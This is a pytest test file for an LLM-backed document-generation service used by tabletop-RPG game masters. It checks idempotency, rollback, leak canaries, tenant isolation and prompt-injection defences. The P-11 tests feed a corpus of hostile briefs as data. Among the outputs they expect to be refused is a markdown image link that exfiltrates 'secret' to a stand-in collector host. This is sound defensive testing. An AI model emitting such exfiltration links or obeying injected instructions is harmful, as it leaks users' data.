"""The document tools through the real tool-invocation route and service
(agent-forge-harness-1kg.4.4, PR 1 of 2): group P of the alignment brief, and
S-6. Every store is an in-memory twin; the executors are the real ones, built
on those twins; the provider is a scripted fake behind the real
`ProviderClientFactory`.

What the GM observes: exactly one document per successful invocation whatever
the retries (AE-13, AE-84, RAIL-23, RAIL-27), a link and closed sentences in
the answer and nothing else of the document (SEC-20), no orphan on any failure
(X-6), nothing revealed on creation (AE-25, M-5), and the injection corpus
held as data (T-10). Races on PostgreSQL are `tests/test_document_tools_db.py`'s.

Run from the repo root:
    uv run python -m pytest service/tests/test_document_tools_api.py -q
"""

from __future__ import annotations

import json
import logging
from collections.abc import Callable, Iterator
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from typing import Any, cast

import httpx
import openai
import pytest
from fastapi import Request
from fastapi.testclient import TestClient
from httpx import Response
from langchain_core.messages import AIMessage

from service import (
    documents_api,
    generate,
    timeline_api,
    tool_invocations,
    tool_invocations_api,
    tracing,
    usage_capture,
)
from service.app import app, get_message_store, get_timeline_database, get_timeline_store, require_session
from service.campaign_store import InMemoryCampaignStore, shared_rows
from service.conversation_store import InMemoryConversationStore
from service.db import InMemoryDatabase
from service.document_generation import data_tags
from service.document_store import InMemoryDocumentStore
from service.document_tools import DocumentToolExecutor, DocumentToolStores, document_executors
from service.history import InMemoryMessageStore
from service.model_catalog import DEFAULT_ALIAS
from service.providers import ProviderClientFactory
from service.session import SessionData
from service.table_session_store import InMemoryTableSessionStore, no_slots
from service.tests import document_generation_fixtures as fx
from service.timeline_store import InMemoryTimelineStore, TimelineStoreError
from service.tool_invocation_store import InMemoryToolInvocationStore
from service.tool_invocations import (
    ATTEMPT_TTL_S,
    Admission,
    ExecutionContext,
    InvocationStores,
    ToolSettings,
    cancellation_probe,
    context_reader,
)
from service.workbench_contracts import (
    COMMON_FIELDS,
    DOC_TYPE_FIELDS,
    DocumentTypeId,
    FieldKind,
    ToolId,
    ToolInvocationRequest,
)
from service.workbench_load import InMemoryWorkbenchLoad

GM_A, GM_B = 1, 2
T0 = datetime(2026, 9, 29, 12, 0, tzinfo=UTC)
TTL = timedelta(seconds=ATTEMPT_TTL_S)
INV = "inv_docs_0000000000001"
FIELDS = {ToolId.NPC: fx.BASE_FIELDS[fx.NPC], ToolId.ENCOUNTER: fx.BASE_FIELDS[fx.ENCOUNTER]}
TOOLS = (ToolId.NPC, ToolId.ENCOUNTER)
#: The five tables creating a document may change; every other twin table may not.
WRITTEN = frozenset({"documents", "document_versions", "tool_invocations", "tool_attempts", "timeline_entries"})


def good(tool: ToolId = ToolId.NPC, **changes: Any) -> str:
    return fx.envelope({**FIELDS[tool], **changes})


def _transient() -> openai.APIConnectionError:
    return openai.APIConnectionError(request=httpx.Request("POST", "https://provider.invalid"))


class ScriptedLLM:
    """The provider: answers from a script; an item may be a callable run first."""

    def __init__(self) -> None:
        self.script: list[Any] = [good()]
        self.calls: list[dict[str, Any]] = []

    def invoke(self, input: Any, config: Any = None, **kwargs: Any) -> AIMessage:
        self.calls.append({"input": input, "config": config, **kwargs})
        item = self.script[min(len(self.calls) - 1, len(self.script) - 1)]
        while callable(item) and not isinstance(item, BaseException):
            item = item()
        if isinstance(item, BaseException):
            raise item
        return AIMessage(content=item, usage_metadata={"input_tokens": 3, "output_tokens": 5, "total_tokens": 8})


class Sink:
    def __init__(self) -> None:
        self.rows: list[Any] = []

    def write(self, rows: Any) -> int:
        self.rows.extend(rows)
        return len(rows)


@dataclass(frozen=True)
class Table:
    owner: int
    campaign: str
    conversation: str


@dataclass
class World:
    db: InMemoryDatabase
    messages: InMemoryMessageStore
    stores: InvocationStores
    tools: DocumentToolStores
    executors: dict[ToolId, Any]
    llm: ScriptedLLM
    factory: ProviderClientFactory
    sink: Sink
    outcomes: list[str]
    settings: ToolSettings = field(default_factory=lambda: ToolSettings(frozenset(TOOLS)))
    now: list[datetime] = field(default_factory=lambda: [T0])

    def clock(self) -> datetime:
        return self.now[0]

    def table(self, owner: int = GM_A, *, name: str = "Nocturne") -> Table:
        with self.db.transaction() as unit:
            campaign = self.stores.campaigns.create(unit, owner_id=owner, name=name, now=self.now[0]).id
            conversation = self.stores.conversations.create(
                unit, owner_id=owner, campaign_id=campaign, title=None, started_mode=None,
            )
        self.messages.claim_conversation(conversation.id, owner)
        return Table(owner, campaign, conversation.id)

    def tables(self) -> dict[str, dict[Any, Any]]:
        with self.db.transaction() as unit:
            return {name: dict(shared_rows(self.db, name).visible(unit)) for name in sorted(self.db.tables)}

    def count(self, name: str) -> int:
        return len(self.tables().get(name, {}))

    def entries(self, table: Table) -> list[dict[str, Any]]:
        with self.db.transaction() as unit:
            found = self.stores.timeline.entry_window(unit, table.conversation, before=None, limit=50)
        return [cast(dict[str, Any], row.payload) for row in found]


@pytest.fixture
def world(monkeypatch: pytest.MonkeyPatch) -> Iterator[World]:
    db = InMemoryDatabase()
    messages = InMemoryMessageStore()
    campaigns, conversations = InMemoryCampaignStore(db), InMemoryConversationStore(db)
    timeline = InMemoryTimelineStore(db, messages=messages)
    stores = InvocationStores(
        InMemoryToolInvocationStore(db), campaigns, conversations, timeline, InMemoryWorkbenchLoad(db),
    )
    tools = DocumentToolStores(campaigns, conversations, timeline, InMemoryDocumentStore(db))
    llm = ScriptedLLM()
    factory = ProviderClientFactory(client_builders={DEFAULT_ALIAS: llm})
    outcomes: list[str] = []
    made = World(db, messages, stores, tools, dict(document_executors(tools)), llm, factory, Sink(), outcomes)
    overrides: dict[Callable[..., Any], Callable[..., Any]] = {
        tool_invocations_api.get_invocation_stores: lambda: made.stores,
        tool_invocations_api.get_tool_executors: lambda: made.executors,
        tool_invocations_api.get_tool_settings: lambda: made.settings,
        tool_invocations_api.get_clock: lambda: made.clock,
        tool_invocations_api.get_provider_factory: lambda: made.factory,
        documents_api.get_document_stores: lambda: documents_api.DocumentStores(campaigns, tools.documents),
        documents_api.get_clock: lambda: made.now[0],
        get_timeline_database: lambda: made.db,
        get_timeline_store: lambda: made.stores.timeline,
        get_message_store: lambda: made.messages,
    }
    app.dependency_overrides.update(overrides)
    monkeypatch.setattr(usage_capture, "_ledger_provider", lambda: made.sink)
    real_outcome = usage_capture._emit_outcome_record

    def outcome(operation: Any, fields: dict[str, Any]) -> None:
        outcomes.append(f"{fields.get('purpose')}:{fields.get('outcome')}")
        real_outcome(operation, fields)

    monkeypatch.setattr(usage_capture, "_emit_outcome_record", outcome)
    monkeypatch.setattr(generate, "_RETRY_BACKOFF_SECONDS", 0.0)
    _as(GM_A)
    yield made
    for dependency in (*overrides, require_session):
        app.dependency_overrides.pop(cast(Any, dependency), None)


@pytest.fixture
def client(world: World) -> TestClient:
    return TestClient(app)


def _as(user_id: int) -> None:
    def session(request: Request) -> SessionData:
        return SessionData(user_id=user_id, role="dm")

    app.dependency_overrides[require_session] = session


def body(table: Table, *, tool: ToolId = ToolId.NPC, brief: str = "A dwarf smith", invocation_id: str = INV,
         campaign: str | None = None, conversation: str | None = None) -> dict[str, Any]:
    return {
        "schema_version": 1, "invocation_id": invocation_id, "tool_id": tool.value, "brief": brief,
        "campaign_id": campaign or table.campaign, "conversation_id": conversation or table.conversation,
    }


def post(client: TestClient, table: Table, **kwargs: Any) -> Response:
    made = body(table, **kwargs)
    return client.post(f"/campaigns/{made['campaign_id']}/tool-invocations", json=made)


def _messages(call: dict[str, Any]) -> tuple[str, str]:
    system, human = call["input"]
    return str(system.content), str(human.content)


# ── S-6: the route hands the executor its database ───────────────────────────


def test_s6_a_context_read_through_the_route_runs_on_the_routes_database(world: World, client: TestClient) -> None:
    """Kills: the route not passing `reader=`."""
    seen: list[bool] = []

    class _Reading:
        tool_id = ToolId.NPC

        def precheck(self, unit: Any, target: Any) -> None:
            return None

        def run(self, ctx: ExecutionContext) -> Any:
            seen.append(ctx.read(lambda unit: getattr(unit, "_database", None) is world.db))
            return {"tool_id": "npc", "result_kind": "document", "prose": "x", "suggestions": [],
                    "document": {"document_id": "doc_" + "s" * 22, "type": "npc", "title": "T",
                                 "library_category": "npcs"}}

        def finish(self, unit: Any, ctx: ExecutionContext, result: Any) -> Any:
            return result

    world.executors[ToolId.NPC] = _Reading()
    assert post(client, world.table()).json()["status"] == "done"
    assert seen == [True]


# ── P-1, P-2, P-3: one document, linked, however it was asked ────────────────


@pytest.mark.parametrize("tool", TOOLS)
def test_p1_a_tool_creates_one_stored_document_and_answers_its_link(
        world: World, client: TestClient, tool: ToolId) -> None:
    """Kills: persisting outside T2; a link to a document that does not exist."""
    world.llm.script = [good(tool)]
    table = world.table()
    response = post(client, table, tool=tool)
    assert response.status_code == 200, response.text
    answer = response.json()
    assert answer["status"] == "done"
    link = answer["result"]["document"]
    assert (world.count("documents"), world.count("document_versions")) == (1, 1)
    document = client.get(f"/campaigns/{table.campaign}/documents/{link['document_id']}")
    assert document.status_code == 200, document.text
    doc_type = DocumentTypeId(link["type"])
    assert {key: document.json()["data"].get(key) for key in FIELDS[tool]} == FIELDS[tool]
    assert link["title"] == FIELDS[tool]["name"] == document.json()["data"]["name"]
    library = client.post(f"/campaigns/{table.campaign}/library", json={
        "schema_version": 1, "campaign_id": table.campaign, "category": link["library_category"], "search": "",
        "sort": "recent", "archived": False, **({"type": doc_type.value} if tool is ToolId.ENCOUNTER else {}),
    })
    assert library.status_code == 200, library.text
    assert [item["document_id"] for item in library.json()["items"]] == [link["document_id"]]
    [entry] = world.entries(table)
    assert entry["invocation"] == answer


def test_p2_a_repeat_after_done_replays_the_same_bytes_and_creates_nothing(
        world: World, client: TestClient) -> None:
    table = world.table()
    first = post(client, table)
    again = post(client, table)
    assert (again.status_code, again.content) == (first.status_code, first.content)
    assert len(world.llm.calls) == 1
    assert world.count("documents") == 1


def test_p3_ae13_a_failed_attempt_retried_creates_exactly_one_document(world: World, client: TestClient) -> None:
    """Kills: a document written by the failed attempt."""
    world.llm.script = [_transient(), _transient(), good()]
    table = world.table()
    failed = post(client, table).json()
    assert (failed["status"], failed["error"]["code"], failed["error"]["retryable"]) == (
        "failed", "provider_failed", True)
    assert world.count("documents") == 0
    world.now[0] = T0 + timedelta(seconds=30)
    done = post(client, table).json()
    assert (done["status"], done["attempt"]) == ("done", 2)
    assert (world.count("documents"), world.count("document_versions")) == (1, 1)
    assert len(world.entries(table)) == 1


# ── Service-level steps, for the interleavings a synchronous route cannot show ─


def _request(table: Table, tool: ToolId = ToolId.NPC) -> ToolInvocationRequest:
    return ToolInvocationRequest.model_validate(body(table, tool=tool))


def _admit(world: World, table: Table, now: datetime) -> Admission:
    admitted = tool_invocations.submit(world.db, world.stores, world.executors, world.settings,
                                       SessionData(user_id=table.owner, role="dm"), _request(table), now=now,
                                       chat_turns_today=0)
    assert isinstance(admitted, Admission)
    return admitted


def _ctx(world: World, admitted: Admission) -> ExecutionContext:
    return ExecutionContext(admitted, clock=world.clock, factory=world.factory,
                            probe=cancellation_probe(world.db, world.stores, admitted, world.clock),
                            reader=context_reader(world.db))


def _run(world: World, admitted: Admission, ctx: ExecutionContext) -> tool_invocations.Outcome:
    return tool_invocations.execute(world.executors[admitted.target.tool_id], ctx, available=lambda tool: True)


def _complete(world: World, admitted: Admission, ctx: ExecutionContext, outcome: tool_invocations.Outcome) -> Any:
    return tool_invocations.complete(world.db, world.stores, world.executors[admitted.target.tool_id], admitted,
                                     outcome, ctx, now=world.clock())


def _cancel(world: World, table: Table) -> Any:
    return tool_invocations.cancel(world.db, world.stores, table.owner, table.campaign, INV, now=world.clock())


def test_p4_ae84_a_late_expired_attempt_is_fenced_out_and_only_its_retry_creates_the_document(
        world: World) -> None:
    """Kills: `finish` run on a fenced-out attempt; the carry shared across attempts."""
    world.llm.script = [good(name="First"), good(name="Second")]
    table = world.table()
    first = _admit(world, table, T0)
    first_ctx = _ctx(world, first)
    first_outcome = _run(world, first, first_ctx)
    assert first_outcome.result is not None
    world.now[0] = T0 + TTL + timedelta(seconds=1)
    second = _admit(world, table, world.clock())
    assert second.attempt == 2
    second_ctx = _ctx(world, second)
    second_outcome = _run(world, second, second_ctx)
    late = _complete(world, first, first_ctx, first_outcome)
    assert (late.status.value, late.attempt) == ("working", 2)
    assert world.count("documents") == 0
    done = _complete(world, second, second_ctx, second_outcome)
    assert (done.status.value, done.result.document.title) == ("done", "Second")
    assert (world.count("documents"), world.count("document_versions")) == (1, 1)


def test_p5a_a_cancel_before_the_provider_call_spends_nothing_and_creates_nothing(world: World) -> None:
    table = world.table()
    admitted = _admit(world, table, T0)
    _cancel(world, table)
    token = usage_capture.begin_operation(mode="gm", billed_account_id=GM_A,
                                          operation=usage_capture.OPERATION_TOOL_INVOCATION,
                                          operation_id=admitted.operation_id)
    try:
        ctx = _ctx(world, admitted)
        outcome = _run(world, admitted, ctx)
        settled = _complete(world, admitted, ctx, outcome)
    finally:
        usage_capture.end_operation(token)
    assert (outcome.cancelled, settled.status.value) == (True, "cancelled")
    assert world.llm.calls == [] and world.count("documents") == 0
    assert world.sink.rows == [] and world.outcomes == []


def test_p5b_a_cancel_between_provider_attempts_creates_nothing(world: World) -> None:
    table = world.table()
    world.llm.script = [lambda: (_cancel(world, table), _transient())[1], good()]
    admitted = _admit(world, table, T0)
    ctx = _ctx(world, admitted)
    outcome = _run(world, admitted, ctx)
    settled = _complete(world, admitted, ctx, outcome)
    assert (outcome.cancelled, settled.status.value) == (True, "cancelled")
    assert len(world.llm.calls) == 1 and world.count("documents") == 0


def test_p5c_a_cancel_after_the_provider_finished_keeps_the_result_and_its_one_document(world: World) -> None:
    """RAIL-23. Kills: a kept result dropped."""
    table = world.table()
    admitted = _admit(world, table, T0)
    ctx = _ctx(world, admitted)
    outcome = _run(world, admitted, ctx)
    _cancel(world, table)
    settled = _complete(world, admitted, ctx, outcome)
    assert (settled.status.value, settled.cancel_requested) == ("done", True)
    assert settled.result.document.document_id != "doc_pending"
    assert world.count("documents") == 1


# ── P-6: the answer links; it does not carry the document ────────────────────


def _canaried() -> dict[str, Any]:
    """Every NPC field the model may fill, each with its own canary."""
    fields: dict[str, Any] = {}
    for key, kind in {**COMMON_FIELDS, **DOC_TYPE_FIELDS[DocumentTypeId.NPC]}.items():
        mark = f"{key.upper().replace('_', '')}CANARY"
        if kind in (FieldKind.TEXT, FieldKind.PROSE):
            fields[key] = mark
        elif kind is FieldKind.TEXT_LIST and key != "tags":
            fields[key] = [mark]
    return fields


def test_p6_no_field_but_the_name_leaves_and_the_name_only_as_the_title(
        world: World, client: TestClient, caplog: pytest.LogCaptureFixture) -> None:
    """Kills: the body or data embedded in the result; a field logged."""
    fields = _canaried()
    world.llm.script = [fx.envelope(fields)]
    caplog.set_level(logging.DEBUG)
    table = world.table()
    created = post(client, table)
    link = created.json()["result"]["document"]
    status = client.get(f"/campaigns/{table.campaign}/tool-invocations/{INV}")
    page = client.get(timeline_api.PATH.format(conversation_id=table.conversation))
    assert page.status_code == 200, page.text
    stored = client.get(f"/campaigns/{table.campaign}/documents/{link['document_id']}").json()["data"]
    assert stored["true_identity"] == "TRUEIDENTITYCANARY", "the positive control: the document holds every field"
    logged = [record.getMessage() for record in caplog.records]
    assert any("document tool finished" in line for line in logged), "the positive control: logs were captured"
    for text in (created.text, status.text, page.text, *logged):
        leaked = [value for key, value in fields.items() if key != "name" and str(value).strip("[]'") in text]
        assert leaked == [], text
    assert link["title"] == "NAMECANARY"
    assert "NAMECANARY" not in "".join(logged)
    for answer in (created.json(), status.json()):
        assert json.dumps(answer).count("NAMECANARY") == 1
        assert answer["result"]["document"]["title"] == "NAMECANARY"


# ── P-7, P-8: no orphan ──────────────────────────────────────────────────────

_FAMILIES = {
    "not_json": '{"fields": {',
    "bad_envelope": json.dumps({"fields": FIELDS[ToolId.NPC], "cited": [], "type": "npc"}),
    "undeclared_field": good(setup="x"),
    "asset_reference": good(portrait=None),
    "missing_substance": fx.envelope({"name": "Only a name"}),
    "remote_reference": good(name="see https://x.test"),
}


@pytest.mark.parametrize("family", sorted(_FAMILIES))
def test_p7_an_output_that_cannot_be_a_document_fails_retryably_and_leaves_nothing(
        world: World, client: TestClient, family: str) -> None:
    """Kills: persisting before validation; `OutputRefused` unmapped (→ backend)."""
    world.llm.script = [_FAMILIES[family]]
    answer = post(client, world.table()).json()
    assert (answer["status"], answer["error"]["code"], answer["error"]["retryable"]) == (
        "failed", "provider_failed", True)
    assert (world.count("documents"), world.count("document_versions")) == (0, 0)
    assert world.outcomes == ["document_generation:parse_failure"]


def test_p8a_a_document_write_that_fails_inside_finish_rolls_t2_back(world: World, client: TestClient) -> None:
    """Kills: a `finish` that swallows the failure."""

    class _Refusing(InMemoryDocumentStore):
        def create(self, *args: Any, **kwargs: Any) -> Any:
            raise RuntimeError("refused")

    world.executors[ToolId.NPC] = DocumentToolExecutor(ToolId.NPC, DocumentToolStores(
        world.tools.campaigns, world.tools.conversations, world.tools.timeline, _Refusing(world.db)))
    table = world.table()
    assert post(client, table).status_code == 503
    assert (world.count("documents"), world.count("document_versions")) == (0, 0)
    assert client.get(f"/campaigns/{table.campaign}/tool-invocations/{INV}").json()["status"] == "working"


def test_p8b_a_settle_that_fails_after_the_document_was_written_rolls_the_document_back(
        world: World, client: TestClient) -> None:
    """Kills: a `finish` that commits separately."""
    created: list[int] = []

    class _Counting(InMemoryDocumentStore):
        def create(self, *args: Any, **kwargs: Any) -> Any:
            created.append(1)
            return super().create(*args, **kwargs)

    class _Broken(InMemoryTimelineStore):
        def replace_tool_invocation(self, *args: Any, **kwargs: Any) -> Any:
            raise TimelineStoreError("refused")

    world.executors[ToolId.NPC] = DocumentToolExecutor(ToolId.NPC, DocumentToolStores(
        world.tools.campaigns, world.tools.conversations, world.tools.timeline, _Counting(world.db)))
    world.stores = InvocationStores(world.stores.invocations, world.stores.campaigns, world.stores.conversations,
                                    _Broken(world.db, messages=world.messages), world.stores.load)
    assert post(client, world.table()).status_code == 503
    assert created == [1]
    assert (world.count("documents"), world.count("document_versions")) == (0, 0)


# ── P-9, P-10: no tracing; every attempt in the ledger ───────────────────────


def test_p9_no_trace_callback_rides_on_a_document_tools_provider_call(
        world: World, client: TestClient, monkeypatch: pytest.MonkeyPatch) -> None:
    built: list[Any] = []

    def spy(*args: Any, **kwargs: Any) -> dict[str, Any]:
        built.append((args, kwargs))
        return {"callbacks": ["spy"]}

    monkeypatch.setattr(tracing, "build_trace_config", spy)
    monkeypatch.setenv("RAG_TRACING", "1")
    monkeypatch.setenv("K_SERVICE", "aetheril")
    table = world.table(name=f"Camp {fx.CANARY}")
    assert post(client, table, brief=f"A smith {fx.CANARY}").json()["status"] == "done"
    assert built == []
    [call] = world.llm.calls
    assert call["config"]["callbacks"] == []
    assert fx.CANARY not in json.dumps(call["config"], default=str)
    assert fx.CANARY in _messages(call)[1], "the positive control: the canary did reach the data block"


def test_p10_every_attempt_is_a_document_generation_row_of_the_invocations_operation(
        world: World, client: TestClient) -> None:
    world.llm.script = [_transient(), good()]
    table = world.table()
    assert post(client, table).json()["status"] == "done"
    with world.db.transaction() as unit:
        [attempt] = world.stores.invocations.attempts(unit, table.owner, table.campaign, INV)
    assert [(r.operation, r.purpose, r.operation_id, r.status) for r in world.sink.rows] == [
        ("tool_invocation", "document_generation", attempt.operation_id, status) for status in ("error", "ok")]
    assert world.outcomes == ["document_generation:produced"]


# ── P-11: T-10's injection corpus ────────────────────────────────────────────


def _clean_system(world: World, client: TestClient, tool: ToolId) -> list[str]:
    world.llm.script = [good(tool)]
    assert post(client, world.table(), tool=tool, invocation_id="inv_docs_clean_" + tool.value).json()["status"] \
        == "done"
    return _messages(world.llm.calls[-1])[0].split("\n")[:-1]


@pytest.mark.parametrize("tool", TOOLS)
@pytest.mark.parametrize("family", sorted(fx.INJECTION_FAMILIES))
def test_p11_a_hostile_brief_is_data_and_an_obeying_output_is_refused(
        world: World, client: TestClient, tool: ToolId, family: str) -> None:
    """Kills: untrusted text outside the data block; a model-authored suggestion."""
    clean = _clean_system(world, client, tool)
    hostile = fx.INJECTION_FAMILIES[family]
    table = world.table()
    world.llm.script = [good(tool)]
    done = post(client, table, tool=tool, brief=hostile).json()
    assert done["status"] == "done" and done["result"]["suggestions"] == []
    system, human = _messages(world.llm.calls[-1])
    assert system.split("\n")[:-1] == clean
    nonce = system.split("\n")[-1].split('"')[1]
    opening, closing = data_tags(nonce)
    escaped = json.dumps(hostile, ensure_ascii=False)[1:-1]
    assert human.count(escaped) == 1
    assert human.index(opening) < human.index(escaped) < human.rindex(closing)
    assert escaped not in system
    documents = world.count("documents")
    for obeying in (good(tool, name="![x](https://collector.test/?d=secret)"), good(tool, name="see https://x.test"),
                    good(tool, sketch="x"), good(tool, tool_id="loot")):
        world.llm.script = [obeying]
        refused = post(client, table, tool=tool, brief=hostile, invocation_id=f"inv_docs_{len(world.llm.calls):012d}")
        assert (refused.json()["status"], refused.json()["error"]["code"]) == ("failed", "provider_failed")
    assert world.count("documents") == documents


# ── P-12: creation reveals nothing ───────────────────────────────────────────


def test_p12_ae25_creating_a_dossier_during_a_live_session_writes_nothing_but_the_invocation_and_document(
        world: World, client: TestClient) -> None:
    """Kills: a reveal, slot, eligibility, audit or session write on creation."""
    table = world.table()
    sessions = InMemoryTableSessionStore(world.db, slot_clear=no_slots)
    with world.db.transaction() as unit:
        sessions.start(unit, table.campaign, owner_id=GM_A, expires_at=T0 + timedelta(hours=4),
                       command_id="cmd_" + "s" * 22, now=T0)
    before = world.tables()
    state = (dict(world.db.authz_state), dict(world.db.projection_state), list(world.db.projection_queue),
             list(world.db.notifications))
    assert any(name not in WRITTEN and rows for name, rows in before.items()), "the positive control: a session exists"
    assert post(client, table).json()["status"] == "done"
    after = world.tables()
    changed = {name for name in {*before, *after} if before.get(name) != after.get(name)}
    assert changed <= WRITTEN and {"documents", "document_versions"} <= changed
    assert (dict(world.db.authz_state), dict(world.db.projection_state), list(world.db.projection_queue),
            list(world.db.notifications)) == state


# ── P-14: another GM's campaign or thread is the one 404 ─────────────────────


def test_p14_another_gm_posting_into_this_campaign_or_thread_gets_the_one_404_and_creates_nothing(
        world: World, client: TestClient) -> None:
    mine, theirs = world.table(GM_A), world.table(GM_B)
    _as(GM_B)
    for made in (dict(campaign=mine.campaign, conversation=mine.conversation),
                 dict(campaign=theirs.campaign, conversation=mine.conversation),
                 dict(campaign=mine.campaign, conversation=theirs.conversation)):
        response = post(client, theirs, **made)
        assert response.status_code == 404, response.text
    assert world.llm.calls == [] and world.count("documents") == 0 and world.count("tool_invocations") == 0
    assert post(client, theirs).json()["status"] == "done", "the positive control: B's own table works"
